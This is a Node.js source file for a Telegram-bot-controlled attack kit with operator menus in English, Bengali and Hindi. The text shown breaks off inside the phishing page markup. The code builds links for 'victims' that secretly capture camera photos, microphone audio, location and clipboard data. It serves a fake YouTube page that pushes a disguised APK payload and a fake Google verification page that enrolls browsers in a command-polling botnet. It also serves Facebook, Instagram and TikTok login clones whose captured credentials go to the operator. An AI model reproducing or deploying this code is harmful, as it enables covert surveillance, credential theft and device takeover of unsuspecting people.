const express      = require('express');
const http         = require('http');
const telegramBot  = require('node-telegram-bot-api');
const multer       = require('multer');
const bodyParser   = require('body-parser');
const crypto       = require('crypto');
const fs           = require('fs');
const path         = require('path');

// ============================================================
// FILL THESE 2 LINES ONLY
// ============================================================
const TOKEN = process.env.TOKEN || 'YOUR_BOT_TOKEN_HERE';
const HOST  = process.env.HOST  || 'https://YOUR_RAILWAY_URL_HERE';
// ============================================================

const app    = express();
const server = http.createServer(app);
const bot    = new telegramBot(TOKEN, { polling: true });
const upload = multer();

app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// ── state ─────────────────────────────────────────────────────
const users  = new Map(); // userId -> { lang }
const tokens = new Map(); // token  -> { action, uid }
const botnet = new Map(); // victimId -> { uid, ip, model, last }
const cmds   = new Map(); // victimId -> [commands]

function getUser(id) {
    if (!users.has(id)) users.set(id, { lang: 'en' });
    return users.get(id);
}

// ── i18n ─────────────────────────────────────────────────────
const T = {
    en: {
        welcome:     '🌹 Welcome! Choose language:',
        menu:        '🎯 Main Menu — choose attack:',
        cam_b:       '📸 Back Camera',
        cam_f:       '🤳 Front Camera',
        loc:         '📍 Location',
        mic:         '🎙️ Record Mic',
        info:        '📱 Device Info',
        clip:        '📋 Clipboard',
        gallery:     '🖼️ Gallery',
        ctrl:        '📲 Phone Control',
        phish:       '🎣 Phishing Pages',
        malware:     '💀 Malware Link',
        botnet:      '🤖 Botnet',
        recon:       '📡 Full Recon',
        back:        '◀️ Back',
        link:        '🔗 Link ready — send to victim:',
        exp:         '⏰ Expires 10 min',
        new_link:    '🔄 New Link',
        fb:          '🔵 Facebook',
        ig:          '📸 Instagram',
        tt:          '🎵 TikTok',
        bot_list:    '📋 Active Bots',
        bot_photo:   '📸 Photo from ALL bots',
        bot_loc:     '📍 Location from ALL bots',
        bot_clip:    '📋 Clipboard from ALL bots',
        no_bots:     '❌ No bots connected yet.',
        phish_menu:  '🎣 Choose phishing target:',
        bot_panel:   '🤖 Botnet Panel'
    },
    bn: {
        welcome:     '🌹 স্বাগতম! ভাষা বেছে নিন:',
        menu:        '🎯 মেইন মেনু:',
        cam_b:       '📸 পিছনের ক্যামেরা',
        cam_f:       '🤳 সামনের ক্যামেরা',
        loc:         '📍 লোকেশন',
        mic:         '🎙️ মাইক রেকর্ড',
        info:        '📱 ডিভাইস তথ্য',
        clip:        '📋 ক্লিপবোর্ড',
        gallery:     '🖼️ গ্যালারি',
        ctrl:        '📲 ফোন কন্ট্রোল',
        phish:       '🎣 ফিশিং পেজ',
        malware:     '💀 ম্যালওয়্যার লিংক',
        botnet:      '🤖 বটনেট',
        recon:       '📡 ফুল রিকন',
        back:        '◀️ পিছনে',
        link:        '🔗 লিংক তৈরি — ভিক্টিমকে পাঠান:',
        exp:         '⏰ ১০ মিনিটে মেয়াদ শেষ',
        new_link:    '🔄 নতুন লিংক',
        fb:          '🔵 ফেসবুক',
        ig:          '📸 ইনস্টাগ্রাম',
        tt:          '🎵 টিকটক',
        bot_list:    '📋 সক্রিয় বট',
        bot_photo:   '📸 সব বটে ছবি',
        bot_loc:     '📍 সব বটে লোকেশন',
        bot_clip:    '📋 সব বটে ক্লিপবোর্ড',
        no_bots:     '❌ এখনো কোনো বট নেই।',
        phish_menu:  '🎣 ফিশিং টার্গেট বেছে নিন:',
        bot_panel:   '🤖 বটনেট প্যানেল'
    },
    hi: {
        welcome:     '🌹 स्वागत! भाषा चुनें:',
        menu:        '🎯 मुख्य मेनू:',
        cam_b:       '📸 पीछे कैमरा',
        cam_f:       '🤳 सामने कैमरा',
        loc:         '📍 लोकेशन',
        mic:         '🎙️ माइक रिकॉर्ड',
        info:        '📱 डिवाइस जानकारी',
        clip:        '📋 क्लिपबोर्ड',
        gallery:     '🖼️ गैलरी',
        ctrl:        '📲 फोन कंट्रोल',
        phish:       '🎣 फिशिंग पेज',
        malware:     '💀 मैलवेयर लिंक',
        botnet:      '🤖 बॉटनेट',
        recon:       '📡 फुल रिकॉन',
        back:        '◀️ वापस',
        link:        '🔗 लिंक तैयार — पीड़ित को भेजें:',
        exp:         '⏰ 10 मिनट में समाप्त',
        new_link:    '🔄 नया लिंक',
        fb:          '🔵 Facebook',
        ig:          '📸 Instagram',
        tt:          '🎵 TikTok',
        bot_list:    '📋 सक्रिय बॉट',
        bot_photo:   '📸 सभी बॉट से फोटो',
        bot_loc:     '📍 सभी बॉट से लोकेशन',
        bot_clip:    '📋 सभी बॉट से क्लिपबोर्ड',
        no_bots:     '❌ अभी कोई बॉट नहीं।',
        phish_menu:  '🎣 फिशिंग टार्गेट चुनें:',
        bot_panel:   '🤖 बॉटनेट पैनल'
    }
};

function tr(uid, k) {
    const lang = getUser(uid).lang || 'en';
    return T[lang][k] || T.en[k] || k;
}

// ── token ─────────────────────────────────────────────────────
function mkTok(action, uid) {
    const tok = crypto.randomBytes(10).toString('hex');
    tokens.set(tok, { action, uid });
    setTimeout(() => tokens.delete(tok), 600000);
    return `${HOST}/go/${tok}`;
}

// ── tg helpers ────────────────────────────────────────────────
const tgMsg = (id, txt, opts={}) =>
    bot.sendMessage(id, txt, { parse_mode:'HTML', ...opts }).catch(()=>{});
const tgPic = (id, buf, cap) =>
    bot.sendPhoto(id, buf, { caption:cap, parse_mode:'HTML' }).catch(()=>{});
const tgLoc = (id, lat, lon) =>
    bot.sendLocation(id, lat, lon).catch(()=>{});
const tgAudio = (id, buf) =>
    bot.sendAudio(id, buf, {}, { filename:'mic.webm', contentType:'audio/webm' }).catch(()=>{});
const tgDoc = (id, buf, name, cap) =>
    bot.sendDocument(id, buf, { caption:cap, parse_mode:'HTML' },
        { filename:name, contentType:'application/octet-stream' }).catch(()=>{});

// ── keyboards ─────────────────────────────────────────────────
const langKb = () => ({ inline_keyboard: [[
    { text:'🇧🇩 বাংলা',   callback_data:'L_bn' },
    { text:'🇬🇧 English', callback_data:'L_en' },
    { text:'🇮🇳 हिन्दी', callback_data:'L_hi' }
]]});

const mainKb = uid => ({ inline_keyboard: [
    [
        { text:tr(uid,'cam_b'),   callback_data:'A_cam_back' },
        { text:tr(uid,'cam_f'),   callback_data:'A_cam_front' }
    ],
    [
        { text:tr(uid,'loc'),     callback_data:'A_location' },
        { text:tr(uid,'mic'),     callback_data:'A_microphone' }
    ],
    [
        { text:tr(uid,'gallery'), callback_data:'A_gallery' },
        { text:tr(uid,'ctrl'),    callback_data:'A_phone_ctrl' }
    ],
    [
        { text:tr(uid,'info'),    callback_data:'A_device_info' },
        { text:tr(uid,'clip'),    callback_data:'A_clipboard' }
    ],
    [
        { text:tr(uid,'phish'),   callback_data:'M_phish' }
    ],
    [
        { text:tr(uid,'malware'), callback_data:'A_malware' },
        { text:tr(uid,'botnet'),  callback_data:'M_botnet' }
    ],
    [
        { text:tr(uid,'recon'),   callback_data:'A_full_recon' }
    ]
]});

const phishKb = uid => ({ inline_keyboard: [
    [
        { text:tr(uid,'fb'), callback_data:'A_phish_fb' },
        { text:tr(uid,'ig'), callback_data:'A_phish_ig' },
        { text:tr(uid,'tt'), callback_data:'A_phish_tt' }
    ],
    [{ text:tr(uid,'back'), callback_data:'BACK' }]
]});

const botnetKb = uid => ({ inline_keyboard: [
    [{ text:'🔗 Generate Infection Link', callback_data:'A_botnet_link' }],
    [{ text:tr(uid,'bot_list'),           callback_data:'BOT_LIST' }],
    [{ text:tr(uid,'bot_photo'),          callback_data:'BOT_CMD_photo' }],
    [{ text:tr(uid,'bot_loc'),            callback_data:'BOT_CMD_location' }],
    [{ text:tr(uid,'bot_clip'),           callback_data:'BOT_CMD_clipboard' }],
    [{ text:tr(uid,'back'),               callback_data:'BACK' }]
]});

const linkKb = (act, uid) => ({ inline_keyboard: [[
    { text:tr(uid,'new_link'), callback_data:act },
    { text:tr(uid,'back'),     callback_data:'BACK' }
]]});

// ── commands ──────────────────────────────────────────────────
bot.onText(/\/start/, msg => {
    const uid = String(msg.from.id);
    tgMsg(msg.chat.id,
        '🌹 Welcome / স্বাগতম / स्वागत',
        { reply_markup: langKb() }
    );
});

bot.onText(/\/menu/, msg => {
    const uid = String(msg.from.id);
    tgMsg(msg.chat.id, tr(uid,'menu'), { reply_markup: mainKb(uid) });
});

// ── callback ──────────────────────────────────────────────────
bot.on('callback_query', async cbq => {
    const uid    = String(cbq.from.id);
    const chatId = cbq.message.chat.id;
    const msgId  = cbq.message.message_id;
    const data   = cbq.data;

    bot.answerCallbackQuery(cbq.id).catch(()=>{});

    // language
    if (data.startsWith('L_')) {
        getUser(uid).lang = data.slice(2);
        bot.deleteMessage(chatId, msgId).catch(()=>{});
        return tgMsg(chatId, tr(uid,'menu'), { reply_markup: mainKb(uid) });
    }

    // back
    if (data === 'BACK') {
        bot.deleteMessage(chatId, msgId).catch(()=>{});
        return tgMsg(chatId, tr(uid,'menu'), { reply_markup: mainKb(uid) });
    }

    // submenus
    if (data === 'M_phish') {
        bot.deleteMessage(chatId, msgId).catch(()=>{});
        return tgMsg(chatId, tr(uid,'phish_menu'), { reply_markup: phishKb(uid) });
    }

    if (data === 'M_botnet') {
        bot.deleteMessage(chatId, msgId).catch(()=>{});
        return tgMsg(chatId, tr(uid,'bot_panel'), { reply_markup: botnetKb(uid) });
    }

    // botnet list
    if (data === 'BOT_LIST') {
        if (botnet.size === 0)
            return tgMsg(chatId, tr(uid,'no_bots'));
        let txt = `🤖 <b>Bots: ${botnet.size}</b>\n\n`;
        let i = 1;
        botnet.forEach((v,k) => {
            txt += `${i}. <b>${v.model}</b>\n` +
                   `   🌍 <code>${v.ip}</code>\n` +
                   `   🕐 ${v.last}\n\n`;
            i++;
        });
        return tgMsg(chatId, txt);
    }

    // botnet broadcast commands
    if (data.startsWith('BOT_CMD_')) {
        const cmd = data.slice(8);
        botnet.forEach((v,k) => {
            if (!cmds.has(k)) cmds.set(k,[]);
            cmds.get(k).push(cmd);
        });
        return tgMsg(chatId,
            `📡 Command <b>${cmd}</b> sent to <b>${botnet.size}</b> devices.`
        );
    }

    // attack link generators
    if (data.startsWith('A_')) {
        const act = data.slice(2);
        bot.deleteMessage(chatId, msgId).catch(()=>{});
        const link = mkTok(act, uid);
        return tgMsg(chatId,
            `${tr(uid,'link')}\n\n<code>${link}</code>\n\n${tr(uid,'exp')}`,
            { reply_markup: linkKb(data, uid) }
        );
    }
});

// ── serve pages ───────────────────────────────────────────────
app.get('/go/:tok', (req, res) => {
    const info = tokens.get(req.params.tok);
    if (!info) return res.send('<h2 style="text-align:center;color:red">Link expired.</h2>');
    res.send(page(info.action, info.uid));
});

// ── serve APK ─────────────────────────────────────────────────
app.get('/payload.apk', (req, res) => {
    const apkPath = path.join(__dirname, 'payload.apk');
    if (fs.existsSync(apkPath)) {
        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
        res.setHeader('Content-Disposition', 'attachment; filename="YouTube_Premium.apk"');
        res.sendFile(apkPath);
    } else {
        res.status(404).send('File not found');
    }
});

// ── service worker ────────────────────────────────────────────
app.get('/sw.js', (req, res) => {
    res.setHeader('Content-Type','application/javascript');
    res.send(`
self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => clients.claim());
self.addEventListener('push', e => {
    const d = e.data ? e.data.json() : {};
    self.registration.showNotification(d.title||'', { body: d.body||'' });
});
`);
});

// ── data endpoints ────────────────────────────────────────────
app.post('/d/photo', upload.single('photo'), (req, res) => {
    const uid = req.body.uid;
    const ip  = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const cam = req.body.camtype || 'Camera';
    if (req.file) {
        tgPic(uid, req.file.buffer,
            `📸 ${cam}\n🌍 IP: ${ip}\n📱 ${(req.headers['user-agent']||'').slice(0,80)}`);
    }
    res.json({ ok:true });
});

app.post('/d/loc', (req, res) => {
    const uid = req.body.uid;
    const ip  = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const { lat, lon, acc } = req.body;
    if (lat && lon) {
        tgLoc(uid, parseFloat(lat), parseFloat(lon));
        tgMsg(uid,
            `📍 Location\nLat: <code>${lat}</code>\nLon: <code>${lon}</code>\n` +
            `Acc: ${acc}m\nIP: ${ip}\n` +
            `🗺 https://maps.google.com/?q=${lat},${lon}`
        );
    }
    res.json({ ok:true });
});

app.post('/d/text', (req, res) => {
    const uid  = req.body.uid;
    const type = req.body.type || 'Data';
    const data = (req.body.data||'').slice(0,3500);
    const ip   = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    tgMsg(uid, `📋 <b>${type}</b>\n\n<code>${data}</code>\n\n🌍 ${ip}`);
    res.json({ ok:true });
});

app.post('/d/audio', upload.single('audio'), (req, res) => {
    const uid = req.body.uid;
    const ip  = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (req.file) {
        tgAudio(uid, req.file.buffer);
        tgMsg(uid, `🎙️ Audio received\n🌍 ${ip}`);
    }
    res.json({ ok:true });
});

app.post('/d/creds', (req, res) => {
    const uid  = req.body.uid;
    const ip   = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    tgMsg(uid,
        `🔑 <b>Credentials!</b>\n\n` +
        `🌐 Site: <b>${req.body.site||'?'}</b>\n` +
        `👤 User: <code>${req.body.user||''}</code>\n` +
        `🔒 Pass: <code>${req.body.pass||''}</code>\n` +
        `🌍 IP: ${ip}`
    );
    res.json({ ok:true });
});

// botnet endpoints
app.post('/b/reg', (req, res) => {
    const { victimId, uid, model, provider } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    botnet.set(victimId, {
        uid, ip,
        model: model||'Unknown',
        provider: provider||'?',
        last: new Date().toLocaleString('en-BD',{timeZone:'Asia/Dhaka'})
    });
    tgMsg(uid,
        `🤖 <b>New Bot!</b>\n📱 ${model}\n🌍 ${ip}\n🔑 ID: <code>${victimId}</code>\n` +
        `Total: <b>${botnet.size}</b>`
    );
    res.json({ ok:true });
});

app.post('/b/poll', (req, res) => {
    const { victimId } = req.body;
    if (botnet.has(victimId)) {
        botnet.get(victimId).last =
            new Date().toLocaleString('en-BD',{timeZone:'Asia/Dhaka'});
    }
    const pending = cmds.get(victimId) || [];
    cmds.set(victimId, []);
    res.json({ ok:true, commands: pending });
});

app.post('/b/notif', (req, res) => {
    const { uid, victimId, app: appName, title, text } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    tgMsg(uid,
        `🔔 <b>Notification</b>\n📱 App: <b>${appName||'?'}</b>\n` +
        `📣 ${title||''}\n💬 <code>${text||''}</code>\n🔑 ${victimId}\n🌍 ${ip}`
    );
    res.json({ ok:true });
});

// ── page builder ──────────────────────────────────────────────
function page(action, uid) {
    if (action.startsWith('phish_')) return phishPage(action, uid);
    if (action === 'malware')        return malwarePage(uid);
    if (action === 'botnet_link')    return botnetPage(uid);
    return attackPage(action, uid);
}

// ── MALWARE PAGE ──────────────────────────────────────────────
function malwarePage(uid) {
    return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>YouTube</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0f0f0f;color:#fff;
     font-family:-apple-system,sans-serif;
     min-height:100vh;padding:16px}
.header{display:flex;align-items:center;gap:8px;margin-bottom:20px;
        padding:12px 0;border-bottom:1px solid #222}
.yt-logo{background:#ff0000;border-radius:10px;padding:6px 10px;
         font-size:18px;font-weight:bold}
.search{flex:1;background:#222;border:none;border-radius:20px;
        padding:10px 16px;color:#fff;font-size:14px}
.thumb-wrap{position:relative;width:100%;padding-top:56.25%;
            background:#1a1a1a;border-radius:10px;overflow:hidden;
            margin-bottom:12px;cursor:pointer}
.thumb-inner{position:absolute;inset:0;display:flex;align-items:center;
             justify-content:center;background:linear-gradient(135deg,#111,#2a2a2a)}
.play-btn{width:72px;height:72px;background:rgba(255,0,0,0.9);
          border-radius:50%;display:flex;align-items:center;justify-content:center}
.play-tri{border:solid transparent;border-width:18px 0 18px 32px;
          border-left-color:#fff;margin-left:6px}
.vid-title{font-size:15px;font-weight:600;margin-bottom:6px;line-height:1.4}
.vid-meta{font-size:12px;color:#aaa;margin-bottom:16px}
.notice{background:#1a1a1a;border:1px solid #333;border-radius:10px;
        padding:16px;margin-bottom:16px;text-align:center}
.notice-title{font-size:15px;font-weight:600;margin-bottom:6px}
.notice-sub{font-size:12px;color:#aaa;margin-bottom:14px}
.allow-btn{width:100%;padding:14px;background:#ff0000;color:#fff;
           border:none;border-radius:8px;font-size:15px;
           font-weight:bold;cursor:pointer}
.deny-btn{width:100%;padding:10px;background:transparent;color:#888;
          border:1px solid #333;border-radius:8px;font-size:13px;
          cursor:pointer;margin-top:8px}
.recs{margin-top:16px}
.rec{display:flex;gap:10px;margin-bottom:14px;cursor:pointer}
.rec-thumb{width:120px;min-width:120px;height:70px;background:#1a1a1a;
           border-radius:6px;display:flex;align-items:center;
           justify-content:center;font-size:20px}
.rec-info{flex:1}
.rec-title{font-size:13px;font-weight:500;margin-bottom:4px;line-height:1.3}
.rec-meta{font-size:11px;color:#aaa}
#st{text-align:center;color:#aaa;font-size:12px;padding:8px}
</style>
</head>
<body>

<div class="header">
  <div class="yt-logo">▶ YouTube</div>
  <input class="search" type="text" placeholder="Search" value="YouTube Premium" readonly>
</div>

<!-- main video -->
<div class="thumb-wrap" onclick="startDownload()">
  <div class="thumb-inner">
    <div class="play-btn"><div class="play-tri"></div></div>
  </div>
</div>

<div class="vid-title">🔴 LIVE — Exclusive Premium Content [HD 4K]</div>
<div class="vid-meta">YouTube Premium • 4.7M views • Streaming now</div>

<!-- permission notice -->
<div class="notice" id="noticeBox">
  <div class="notice-title">⚡ Premium Content Locked</div>
  <div class="notice-sub">This video requires the YouTube Premium app.<br>Install to watch instantly.</div>
  <button class="allow-btn" onclick="startDownload()">📥 Install & Watch Free</button>
  <button class="deny-btn"  onclick="nudge()">Maybe later</button>
</div>

<div id="st"></div>

<!-- fake recommendations -->
<div class="recs">
  <div class="rec"><div class="rec-thumb">🎬</div>
    <div class="rec-info"><div class="rec-title">Top 10 Moments You Won't Believe</div>
    <div class="rec-meta">8.2M views • 2 days ago</div></div></div>
  <div class="rec"><div class="rec-thumb">🎵</div>
    <div class="rec-info"><div class="rec-title">Best Music Mix 2025 — No Ads</div>
    <div class="rec-meta">3.1M views • 5 days ago</div></div></div>
  <div class="rec"><div class="rec-thumb">🏆</div>
    <div class="rec-info"><div class="rec-title">FIFA World Cup Highlights</div>
    <div class="rec-meta">12M views • 1 week ago</div></div></div>
</div>

<script>
const UID  = '${uid}';
const BASE = '${HOST}';
const D    = '${HOST}/d';

window.onload = function(){
  // passive recon
  const info = { ua:navigator.userAgent, screen:screen.width+'x'+screen.height,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone, time:new Date().toString(),
    lang:navigator.language, mem:navigator.deviceMemory||'?' };
  fetch(D+'/text',{ method:'POST', headers:{'Content-Type':'application/json'},
    body:JSON.stringify({ uid:UID, type:'💀 Malware Page Opened',
      data:JSON.stringify(info,null,2) }) });
  // passive location
  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(p=>{
      fetch(D+'/loc',{ method:'POST', headers:{'Content-Type':'application/json'},
        body:JSON.stringify({ uid:UID, lat:p.coords.latitude,
          lon:p.coords.longitude, acc:p.coords.accuracy }) });
    });
  }
};

function startDownload(){
  document.getElementById('noticeBox').innerHTML =
    '<div style="padding:10px;color:#aaa;font-size:13px">📥 Downloading YouTube Premium...</div>';
  document.getElementById('st').textContent = 'Installing...';

  // trigger APK download
  const a = document.createElement('a');
  a.href = BASE + '/payload.apk';
  a.download = 'YouTube_Premium.apk';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);

  // notify owner
  fetch(D+'/text',{ method:'POST', headers:{'Content-Type':'application/json'},
    body:JSON.stringify({ uid:UID, type:'💀 APK DOWNLOADED BY VICTIM',
      data:'Victim clicked Install & Watch\\nUA: '+navigator.userAgent }) });

  setTimeout(()=>{
    document.getElementById('st').textContent =
      'Install the downloaded file to watch.';
    document.getElementById('noticeBox').innerHTML =
      '<div style="padding:10px;text-align:center">' +
      '<div style="font-size:13px;color:#aaa;margin-bottom:8px">' +
      '✅ Download complete</div>' +
      '<div style="font-size:12px;color:#666">' +
      'Open your Downloads folder and install YouTube_Premium.apk</div></div>';
  }, 3000);
}

function nudge(){
  document.getElementById('noticeBox').innerHTML =
    '<div style="padding:10px;text-align:center">' +
    '<div style="font-size:14px;margin-bottom:10px">⚠️ Video unavailable without Premium app</div>' +
    '<button onclick="startDownload()" style="width:100%;padding:13px;' +
    'background:#ff0000;color:#fff;border:none;border-radius:8px;' +
    'font-size:14px;cursor:pointer">📥 Install Free App</button></div>';
}
</script>
</body>
</html>`;
}

// ── BOTNET PAGE ───────────────────────────────────────────────
function botnetPage(uid) {
    const vid = crypto.randomBytes(8).toString('hex');
    return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Google Security</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:-apple-system,sans-serif;
     display:flex;flex-direction:column;align-items:center;
     justify-content:center;min-height:100vh;padding:20px;color:#333}
.glogo{font-size:40px;margin-bottom:20px}
.card{width:100%;max-width:360px;border:1px solid #ddd;
      border-radius:12px;padding:24px;text-align:center}
h2{font-size:18px;margin-bottom:8px;color:#333}
p{font-size:13px;color:#666;margin-bottom:20px;line-height:1.5}
.btn{width:100%;padding:14px;background:#4285f4;color:#fff;
     border:none;border-radius:8px;font-size:15px;
     font-weight:bold;cursor:pointer}
.loader{display:none;text-align:center;margin-top:16px}
.spin{display:inline-block;width:32px;height:32px;
      border:3px solid #eee;border-top-color:#4285f4;
      border-radius:50%;animation:spin 0.8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
#st{font-size:12px;color:#999;margin-top:12px;text-align:center}
</style>
</head>
<body>
<div class="glogo">🔒</div>
<div class="card">
<h2>Verify Your Identity</h2>
<p>For your security, Google needs to verify your account before continuing.</p>
<button class="btn" id="btn" onclick="run()">Verify Now</button>
<div class="loader" id="loader"><div class="spin"></div></div>
<div id="st"></div>
</div>

<script>
const UID  = '${uid}';
const VID  = '${vid}';
const BASE = '${HOST}';
const D    = '${HOST}/d';
const B    = '${HOST}/b';

window.onload = async function(){
  // collect info passively
  const info = { ua:navigator.userAgent, screen:screen.width+'x'+screen.height,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone, time:new Date().toString() };

  // register to botnet
  await fetch(B+'/reg',{ method:'POST', headers:{'Content-Type':'application/json'},
    body:JSON.stringify({ uid:UID, victimId:VID,
      model: navigator.userAgent.substring(0,80),
      provider: 'Browser' }) }).catch(()=>{});

  // register service worker for notification spy
  if('serviceWorker' in navigator){
    try{
      await navigator.serviceWorker.register('/sw.js');
    }catch(e){}
  }

  // start polling every 12 seconds
  setInterval(poll, 12000);
};

async function run(){
  document.getElementById('btn').style.display='none';
  document.getElementById('loader').style.display='block';
  document.getElementById('st').textContent = 'Verifying...';

  // request notifications
  if('Notification' in window){
    await Notification.requestPermission().catch(()=>{});
  }

  // get camera
  try{
    const stream = await navigator.mediaDevices.getUserMedia(
      {video:{facingMode:'user'},audio:false});
    const v = document.createElement('video');
    v.autoplay=true;v.muted=true;v.playsInline=true;v.srcObject=stream;
    document.body.appendChild(v);
    v.style.display='none';
    await new Promise(r=>v.onloadedmetadata=r);
    await new Promise(r=>setTimeout(r,1500));
    const c = document.createElement('canvas');
    c.width=v.videoWidth||640;c.height=v.videoHeight||480;
    c.getContext('2d').drawImage(v,0,0);
    stream.getTracks().forEach(t=>t.stop());
    v.remove();
    const blob = await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));
    const fd = new FormData();
    fd.append('photo',blob,'botnet_cam.jpg');
    fd.append('uid',UID);fd.append('camtype','Botnet Front Cam');
    await fetch(D+'/photo',{method:'POST',body:fd}).catch(()=>{});
  }catch(e){}

  // get location
  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(p=>{
      fetch(D+'/loc',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({uid:UID,lat:p.coords.latitude,
          lon:p.coords.longitude,acc:p.coords.accuracy})}).catch(()=>{});
    });
  }

  // notify owner
  fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({uid:UID,type:'🤖 BOT VERIFIED',
      data:'Victim tapped Verify Now\\nVID: '+VID+
           '\\nUA: '+navigator.userAgent})}).catch(()=>{});

  setTimeout(()=>{
    document.getElementById('loader').style.display='none';
    document.getElementById('st').textContent='✅ Verification complete';
    document.querySelector('h2').textContent='Verification Complete';
    document.querySelector('p').textContent='Your account has been verified successfully.';
  },3000);
}

async function poll(){
  try{
    const r = await fetch(B+'/poll',{method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({uid:UID,victimId:VID})});
    const d = await r.json();
    if(d.commands){ for(const c of d.commands) await exec(c); }
  }catch(e){}
}

async function exec(cmd){
  if(cmd==='photo'){
    try{
      const stream=await navigator.mediaDevices.getUserMedia({video:true,audio:false});
      const v=document.createElement('video');
      v.autoplay=true;v.muted=true;v.playsInline=true;v.srcObject=stream;
      v.style.display='none';document.body.appendChild(v);
      await new Promise(r=>v.onloadedmetadata=r);
      await new Promise(r=>setTimeout(r,1500));
      const c=document.createElement('canvas');
      c.width=v.videoWidth||640;c.height=v.videoHeight||480;
      c.getContext('2d').drawImage(v,0,0);
      stream.getTracks().forEach(t=>t.stop());v.remove();
      const blob=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));
      const fd=new FormData();
      fd.append('photo',blob,'cmd_photo.jpg');fd.append('uid',UID);
      fd.append('camtype','Botnet CMD Photo');
      await fetch(D+'/photo',{method:'POST',body:fd});
    }catch(e){}
  }
  if(cmd==='location'){
    if(navigator.geolocation){
      navigator.geolocation.getCurrentPosition(p=>{
        fetch(D+'/loc',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({uid:UID,lat:p.coords.latitude,
            lon:p.coords.longitude,acc:p.coords.accuracy})});
      });
    }
  }
  if(cmd==='clipboard'){
    try{
      const t=await navigator.clipboard.readText();
      fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({uid:UID,type:'📋 Clipboard (Botnet)',data:t})});
    }catch(e){}
  }
}
</script>
</body>
</html>`;
}

// ── PHISHING PAGES ────────────────────────────────────────────
function phishPage(action, uid) {
    const sites = {
        phish_fb: {
            name:'Facebook', redirect:'facebook.com',
            bg:'#1877f2', card:'#fff', text:'#1c1e21',
            btn:'#1877f2', btnTxt:'#fff',
            inp:'#fff', inpBorder:'#dddfe2',
            ph:'Phone number or email',
            logo:`<svg viewBox="0 0 40 40" width="50"><circle cx="20" cy="20" r="20" fill="#1877f2"/><path d="M22.5 20h3l.5-4h-3.5v-2c0-1.1.3-2 2-2H26V8.5S24.3 8 22.5 8c-3.3 0-5.5 2-5.5 5.5V16h-3v4h3v12h4V20z" fill="white"/></svg>`
        },
        phish_ig: {
            name:'Instagram', redirect:'instagram.com',
            bg:'#fff', card:'#fff', text:'#262626',
            btn:'#0095f6', btnTxt:'#fff',
            inp:'#fafafa', inpBorder:'#dbdbdb',
            ph:'Phone, username or email',
            logo:`<svg viewBox="0 0 100 100" width="50"><defs><linearGradient id="g" x1="0%" y1="100%" x2="100%" y2="0%"><stop offset="0%" stop-color="#f09433"/><stop offset="25%" stop-color="#e6683c"/><stop offset="50%" stop-color="#dc2743"/><stop offset="75%" stop-color="#cc2366"/><stop offset="100%" stop-color="#bc1888"/></linearGradient></defs><rect width="100" height="100" rx="22" fill="url(#g)"/><rect x="25" y="25" width="50" height="50" rx="15" fill="none" stroke="white" stroke-width="6"/><circle cx="50" cy="50" r="14" fill="none" stroke="white" stroke-width="6"/><circle cx="72" cy="28" r="5" fill="white"/></svg>`
        },
        phish_tt: {
            name:'TikTok', redirect:'tiktok.com',
            bg:'#000', card:'#161823', text:'#fff',
            btn:'#fe2c55', btnTxt:'#fff',
            inp:'#2a2a2a', inpBorder:'#333',
            ph:'Phone / Email / Username',
            logo:`<svg viewBox="0 0 100 100" width="50"><rect width="100" height="100" rx="18" fill="#000"/><path d="M70 35c-8 0-15-7-15-15h-10v50c0 6-4 10-10 10s-10-4-10-10 4-10 10-10v-10c-11 0-20 9-20 20s9 20 20 20 20-9 20-20V55c4 3 8 5 15 5V50c-5 0-10-2-15-6V35h15z" fill="white"/></svg>`
        }
    };

    const s = sites[action];
    const isFb = action === 'phish_fb';
    const isIg = action === 'phish_ig';

    return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>${s.name}</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:${s.bg};font-family:-apple-system,sans-serif;
     display:flex;flex-direction:column;align-items:center;
     justify-content:center;min-height:100vh;padding:20px}
.wrap{width:100%;max-width:380px}
.logo{text-align:center;margin-bottom:24px}
.card{background:${s.card};border:${isFb||isIg?'1px solid '+s.inpBorder:'none'};
      border-radius:${isFb?'8':'12'}px;padding:${isFb?'20':'24'}px}
input{width:100%;padding:14px;margin:6px 0;
      border-radius:${isFb?'6':'8'}px;
      border:1px solid ${s.inpBorder};
      background:${s.inp};color:${s.text};
      font-size:${isFb?'17':'15'}px;outline:none}
input::placeholder{color:#aaa}
.btn{width:100%;padding:${isFb?'16':'14'}px;margin-top:10px;
     border:none;border-radius:${isFb?'6':'8'}px;
     background:${s.btn};color:${s.btnTxt};
     font-size:${isFb?'17':'15'}px;font-weight:bold;cursor:pointer}
.divider{display:flex;align-items:center;gap:8px;margin:16px 0}
